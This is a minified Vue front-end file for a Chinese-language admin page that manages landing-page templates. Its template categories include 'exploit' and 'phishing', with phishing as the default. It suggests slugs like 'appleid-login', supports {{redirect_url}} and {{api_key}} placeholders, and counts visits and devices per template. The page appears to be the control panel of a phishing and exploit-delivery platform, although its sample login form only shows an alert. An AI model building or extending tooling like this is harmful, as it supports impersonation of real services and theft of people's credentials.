import{_ as ue,o as pe,a as h,c as E,b as r,d as l,w as a,p as re,y as k,E as v,g as p,r as A,h as f,j as q,a9 as me,I as ce,Q as fe,q as c,z as C,e as L,R,a8 as ge,H as be}from"./index-6_vwbDoj.js";import{r as I}from"./twofa-BlWIohaw.js";const _e={class:"templates-page"},ve={class:"page-card"},ye={class:"page-header"},xe={style:{display:"flex",gap:"8px"}},he={class:"search-bar"},we={class:"mono"},Ve={key:0,class:"status-dot status-dot-success",title:"启用"},ke={key:1,class:"status-dot status-dot-info",title:"禁用"},Ce={style:{height:"100%",display:"flex","flex-direction":"column",gap:"10px"}},ze={style:{display:"flex",gap:"8px","align-items":"center"}},Ue=["src","title"],Se={__name:"Templates",setup($e){const T=f([]),M=f(0),B=f(1),z=f(50),g=A({q:"",category:"",enabled:""}),y=f(!1),F=f(!1),x=f(""),w=f(""),U=f(!1),N=f(null),K=f(!0),o=A(S()),P={slug:[{required:!0,message:"请输入 Slug",trigger:"blur"}],name:[{required:!0,message:"请输入名称",trigger:"blur"}],category:[{required:!0,message:"请选择分类",trigger:"change"}],html_index:[{required:!0,message:"请输入 HTML 内容",trigger:"blur"}]};function S(){return{id:null,slug:"",name:"",category:"phishing",title:"",description:"",html_index:"",preview_url:"",enabled:!0,tpl_otp:""}}function G(s){return{exploit:"漏洞利用",phishing:"钓鱼页面",login:"登录模拟",generic:"通用页面"}[s]||s||"通用"}function Q(s){return{exploit:"danger",phishing:"warning",login:"primary",generic:"info"}[s]||"info"}function J(){Object.assign(o,S()),o.html_index=$(),y.value=!0}function W(s){Object.assign(o,{...S(),...s,enabled:s.enabled!==0&&s.enabled!==!1,html_index:s.html_index||s.html_content||$(),tpl_otp:""}),y.value=!0}function X(s){Object.assign(o,{...S(),...s,id:null,slug:(s.slug||"tpl")+"_copy_"+Date.now().toString(36),name:(s.name||"模板")+" 副本",html_index:s.html_index||s.html_content||$(),tpl_otp:""}),y.value=!0}function Y(s){if(w.value=s.name||s.slug||"模板预览",s.id){const e=window.location.origin.replace(/\/$/,"");x.value=`${e}/api/templates/${s.id}/preview`}else{x.value="";try{const e=s.html_index||s.html_content||$(),u=new Blob([e],{type:"text/html;charset=utf-8"});x.value=URL.createObjectURL(u)}catch{}}F.value=!0}function $(){return`<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>{{title}}</title>
<style>
* { box-sizing: border-box; }
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
  background: linear-gradient(135deg,#667eea 0%,#764ba2 100%);
  min-height: 100vh;
  display: flex; align-items: center; justify-content: center;
  padding: 20px;
}
.card {
  background: #fff;
  border-radius: 14px;
  padding: 34px 28px;
  width: 100%;
  max-width: 380px;
  box-shadow: 0 18px 50px rgba(0,0,0,0.18);
}
.card h2 { margin: 0 0 8px; text-align: center; font-size: 22px; }
.card p.sub { margin: 0 0 22px; text-align: center; color: #909399; font-size: 14px; }
.field { margin-bottom: 14px; }
.field label { display: block; margin-bottom: 6px; font-size: 13px; color: #606266; }
.field input {
  width: 100%;
  height: 42px;
  border: 1px solid #dcdfe6;
  border-radius: 8px;
  padding: 0 12px;
  font-size: 15px;
  outline: none;
  transition: border-color .15s;
}
.field input:focus { border-color: #409eff; }
.btn {
  width: 100%;
  height: 44px;
  border: 0;
  border-radius: 8px;
  background: #409eff;
  color: #fff;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 8px;
}
.btn:active { opacity: .85; }
</style>
</head>
<body>
  <div class="card">
    <h2>{{title || '欢迎登录'}}</h2>
    <p class="sub">请输入账号信息以继续</p>
    <form onsubmit="event.preventDefault();alert('已提交（演示）');">
      <div class="field">
        <label>账号</label>
        <input type="text" placeholder="请输入账号" autocomplete="username" />
      </div>
      <div class="field">
        <label>密码</label>
        <input type="password" placeholder="请输入密码" autocomplete="current-password" />
      </div>
      <button class="btn" type="submit">继续</button>
    </form>
  </div>
</body>
</html>`}async function m(){var s,e,u,n;try{const i={skip:(B.value-1)*z.value,limit:z.value,search:g.q||void 0,category:g.category||void 0,enabled:g.enabled===""?void 0:g.enabled},d=await k.get("/api/templates",{params:i});T.value=((s=d.data)==null?void 0:s.items)||[],M.value=((e=d.data)==null?void 0:e.total)||0}catch(i){const d=((n=(u=i==null?void 0:i.response)==null?void 0:u.data)==null?void 0:n.detail)||(i==null?void 0:i.message)||"模板加载失败";v.error(d),T.value=[],M.value=0}}async function Z(){var e,u;if(!(!N.value||!await N.value.validate().catch(()=>!1))){U.value=!0;try{const n=await I(o.id?"update template":"create template");if(n===!1){U.value=!1;return}const i={slug:o.slug,name:o.name,category:o.category,title:o.title||null,description:o.description||null,html_index:o.html_index||null,preview_url:o.preview_url||null,enabled:o.enabled},d={};n&&(d.otp_code=n),o.id?(await k.patch(`/api/templates/${o.id}`,i,{params:d}),v.success("模板已更新")):(await k.post("/api/templates",i,{params:d}),v.success("模板创建成功")),y.value=!1,m()}catch(n){const i=((u=(e=n==null?void 0:n.response)==null?void 0:e.data)==null?void 0:u.detail)||(n==null?void 0:n.message)||"保存失败";v.error(i)}finally{U.value=!1}}}async function ee(s){var e,u;try{await be.confirm(`确认删除模板「${s.name}」？已使用此模板的渠道需重新指定。`,"删除模板",{type:"warning"});const n=await I("delete template");if(n===!1)return;const i={};n&&(i.otp_code=n),await k.delete(`/api/templates/${s.id}`,{params:i}),v.success("已删除"),m()}catch(n){if(n!=="cancel"&&n!=="close"){const i=((u=(e=n==null?void 0:n.response)==null?void 0:e.data)==null?void 0:u.detail)||(n==null?void 0:n.message)||"删除失败";v.error(i)}}}async function le(s=!1){var e,u,n;try{const i=await k.post("/api/templates/seed",null,{params:{force:s}});v.success(((e=i.data)==null?void 0:e.message)||"已加载默认模板"),m()}catch(i){const d=((n=(u=i==null?void 0:i.response)==null?void 0:u.data)==null?void 0:n.detail)||(i==null?void 0:i.message)||"加载默认模板失败";v.error(d),m()}}return pe(m),(s,e)=>{const u=p("el-icon"),n=p("el-button"),i=p("el-input"),d=p("el-option"),j=p("el-select"),b=p("el-table-column"),H=p("el-tag"),te=p("el-table"),ae=p("el-pagination"),_=p("el-form-item"),V=p("el-col"),O=p("el-row"),ne=p("el-switch"),oe=p("el-form"),ie=p("el-dialog"),se=p("el-link"),de=p("el-drawer");return h(),E("div",_e,[r("div",ve,[r("div",ye,[e[20]||(e[20]=r("div",null,[r("div",{class:"page-title"},"模板管理"),r("div",{class:"page-subtitle"},"落地页模板 CRUD，支持一键加载常用默认模板")],-1)),r("div",xe,[l(n,{onClick:e[0]||(e[0]=t=>le(!1))},{default:a(()=>[l(u,null,{default:a(()=>[l(q(me))]),_:1}),e[18]||(e[18]=r("span",null,"加载默认模板",-1))]),_:1}),l(n,{type:"primary",onClick:J},{default:a(()=>[l(u,null,{default:a(()=>[l(q(ce))]),_:1}),e[19]||(e[19]=r("span",null,"新建模板",-1))]),_:1})])]),r("div",he,[l(i,{modelValue:g.q,"onUpdate:modelValue":e[1]||(e[1]=t=>g.q=t),placeholder:"搜索 Slug / 名称 / 标题",clearable:"",style:{width:"280px"},onClear:m,onKeyup:re(m,["enter"])},{prefix:a(()=>[l(u,null,{default:a(()=>[l(q(fe))]),_:1})]),_:1},8,["modelValue"]),l(j,{modelValue:g.category,"onUpdate:modelValue":e[2]||(e[2]=t=>g.category=t),placeholder:"分类",clearable:"",style:{width:"150px"},onChange:m},{default:a(()=>[l(d,{label:"漏洞利用",value:"exploit"}),l(d,{label:"钓鱼页面",value:"phishing"}),l(d,{label:"登录模拟",value:"login"}),l(d,{label:"通用页面",value:"generic"})]),_:1},8,["modelValue"]),l(j,{modelValue:g.enabled,"onUpdate:modelValue":e[3]||(e[3]=t=>g.enabled=t),placeholder:"状态",clearable:"",style:{width:"140px"},onChange:m},{default:a(()=>[l(d,{label:"全部",value:""}),l(d,{label:"启用",value:!0}),l(d,{label:"禁用",value:!1})]),_:1},8,["modelValue"]),l(n,{type:"primary",onClick:m},{default:a(()=>[...e[21]||(e[21]=[c("搜索",-1)])]),_:1})]),l(te,{data:T.value,stripe:""},{default:a(()=>[l(b,{prop:"slug",label:"Slug",width:"170"},{default:a(({row:t})=>[r("span",we,C(t.slug),1)]),_:1}),l(b,{prop:"name",label:"名称",width:"190"}),l(b,{label:"分类",width:"110"},{default:a(({row:t})=>[l(H,{size:"small",type:Q(t.category),effect:"plain"},{default:a(()=>[c(C(G(t.category)),1)]),_:2},1032,["type"])]),_:1}),l(b,{label:"状态",width:"70"},{default:a(({row:t})=>[t.enabled?(h(),E("span",Ve)):(h(),E("span",ke))]),_:1}),l(b,{prop:"title",label:"页面标题","show-overflow-tooltip":""}),l(b,{prop:"visit_count",label:"访问量",width:"100",sortable:""},{default:a(({row:t})=>[c(C((t.visit_count||0).toLocaleString()),1)]),_:1}),l(b,{prop:"device_count",label:"设备数",width:"90",sortable:""},{default:a(({row:t})=>[c(C(t.device_count||0),1)]),_:1}),l(b,{label:"预览",width:"90"},{default:a(({row:t})=>[l(n,{type:"primary",link:"",size:"small",onClick:D=>Y(t)},{default:a(()=>[...e[22]||(e[22]=[c("预览",-1)])]),_:1},8,["onClick"])]),_:1}),l(b,{label:"操作",width:"190",fixed:"right"},{default:a(({row:t})=>[l(n,{type:"primary",link:"",size:"small",onClick:D=>W(t)},{default:a(()=>[...e[23]||(e[23]=[c("编辑",-1)])]),_:1},8,["onClick"]),l(n,{type:"success",link:"",size:"small",onClick:D=>X(t)},{default:a(()=>[...e[24]||(e[24]=[c("克隆",-1)])]),_:1},8,["onClick"]),l(n,{type:"danger",link:"",size:"small",onClick:D=>ee(t)},{default:a(()=>[...e[25]||(e[25]=[c("删除",-1)])]),_:1},8,["onClick"])]),_:1})]),_:1},8,["data"]),l(ae,{"current-page":B.value,"onUpdate:currentPage":e[4]||(e[4]=t=>B.value=t),"page-size":z.value,"onUpdate:pageSize":e[5]||(e[5]=t=>z.value=t),"page-sizes":[20,50,100,200],total:M.value,layout:"total, sizes, prev, pager, next",background:"",onCurrentChange:m,onSizeChange:m},null,8,["current-page","page-size","total"])]),l(ie,{modelValue:y.value,"onUpdate:modelValue":e[16]||(e[16]=t=>y.value=t),title:o.id?"编辑模板":"新建模板",width:"820px",top:"5vh"},{footer:a(()=>[l(n,{onClick:e[15]||(e[15]=t=>y.value=!1)},{default:a(()=>[...e[26]||(e[26]=[c("取消",-1)])]),_:1}),l(n,{type:"primary",loading:U.value,onClick:Z},{default:a(()=>[...e[27]||(e[27]=[c("保存",-1)])]),_:1},8,["loading"])]),default:a(()=>[l(oe,{model:o,rules:P,ref_key:"formRef",ref:N,"label-width":"100px"},{default:a(()=>[l(O,{gutter:12},{default:a(()=>[l(V,{span:12},{default:a(()=>[l(_,{label:"Slug",prop:"slug"},{default:a(()=>[l(i,{modelValue:o.slug,"onUpdate:modelValue":e[6]||(e[6]=t=>o.slug=t),placeholder:"英文标识（如 appleid-login）",disabled:!!o.id},null,8,["modelValue","disabled"])]),_:1})]),_:1}),l(V,{span:12},{default:a(()=>[l(_,{label:"名称",prop:"name"},{default:a(()=>[l(i,{modelValue:o.name,"onUpdate:modelValue":e[7]||(e[7]=t=>o.name=t),placeholder:"模板名称"},null,8,["modelValue"])]),_:1})]),_:1})]),_:1}),l(O,{gutter:12},{default:a(()=>[l(V,{span:8},{default:a(()=>[l(_,{label:"分类",prop:"category"},{default:a(()=>[l(j,{modelValue:o.category,"onUpdate:modelValue":e[8]||(e[8]=t=>o.category=t),style:{width:"100%"}},{default:a(()=>[l(d,{label:"漏洞利用",value:"exploit"}),l(d,{label:"钓鱼页面",value:"phishing"}),l(d,{label:"登录模拟",value:"login"}),l(d,{label:"通用页面",value:"generic"})]),_:1},8,["modelValue"])]),_:1})]),_:1}),l(V,{span:10},{default:a(()=>[l(_,{label:"页面标题",prop:"title"},{default:a(()=>[l(i,{modelValue:o.title,"onUpdate:modelValue":e[9]||(e[9]=t=>o.title=t),placeholder:"浏览器标题"},null,8,["modelValue"])]),_:1})]),_:1}),l(V,{span:6},{default:a(()=>[l(_,{label:"状态",prop:"enabled"},{default:a(()=>[l(ne,{modelValue:o.enabled,"onUpdate:modelValue":e[10]||(e[10]=t=>o.enabled=t),"active-text":"启用","inactive-text":"禁用"},null,8,["modelValue"])]),_:1})]),_:1})]),_:1}),l(_,{label:"预览链接"},{default:a(()=>[l(i,{modelValue:o.preview_url,"onUpdate:modelValue":e[11]||(e[11]=t=>o.preview_url=t),placeholder:"可选，外部预览 URL"},null,8,["modelValue"])]),_:1}),l(_,{label:"描述",prop:"description"},{default:a(()=>[l(i,{modelValue:o.description,"onUpdate:modelValue":e[12]||(e[12]=t=>o.description=t),type:"textarea",rows:2,placeholder:"模板用途说明"},null,8,["modelValue"])]),_:1}),l(_,{label:"HTML 内容",prop:"html_index"},{default:a(()=>[l(i,{modelValue:o.html_index,"onUpdate:modelValue":e[13]||(e[13]=t=>o.html_index=t),type:"textarea",rows:16,class:"mono",placeholder:"输入完整的 HTML 模板内容，支持占位符如 {{channel}}、{{redirect_url}}、{{api_key}}"},null,8,["modelValue"])]),_:1}),K.value?(h(),L(_,{key:0,label:"2FA 验证码",prop:"tpl_otp"},{default:a(()=>[l(i,{modelValue:o.tpl_otp,"onUpdate:modelValue":e[14]||(e[14]=t=>o.tpl_otp=t),placeholder:"输入 Google Authenticator 6 位数字",maxlength:"6",style:{width:"240px"}},null,8,["modelValue"])]),_:1})):R("",!0)]),_:1},8,["model"])]),_:1},8,["modelValue","title"]),l(de,{modelValue:F.value,"onUpdate:modelValue":e[17]||(e[17]=t=>F.value=t),title:"预览模板："+(w.value||""),direction:"rtl",size:"60%","destroy-on-close":""},{default:a(()=>[r("div",Ce,[r("div",ze,[x.value?(h(),L(se,{key:0,type:"primary",href:x.value,target:"_blank",underline:"never"},{default:a(()=>[l(u,null,{default:a(()=>[l(q(ge))]),_:1}),e[28]||(e[28]=r("span",{style:{"margin-left":"4px"}},"新窗口打开",-1))]),_:1},8,["href"])):R("",!0),w.value?(h(),L(H,{key:1,size:"small",type:"info",effect:"plain"},{default:a(()=>[c(C(w.value),1)]),_:1})):R("",!0),x.value?(h(),L(H,{key:2,size:"small",type:"success",effect:"plain"},{default:a(()=>[...e[29]||(e[29]=[c("真实渲染模式",-1)])]),_:1})):R("",!0)]),r("iframe",{src:x.value,style:{flex:"1",width:"100%",border:"1px solid #ebeef5","border-radius":"6px",background:"#fff"},title:w.value||"template-preview"},null,8,Ue)])]),_:1},8,["modelValue","title"])])}}},Re=ue(Se,[["__scopeId","data-v-b4c76b7a"]]);export{Re as default};
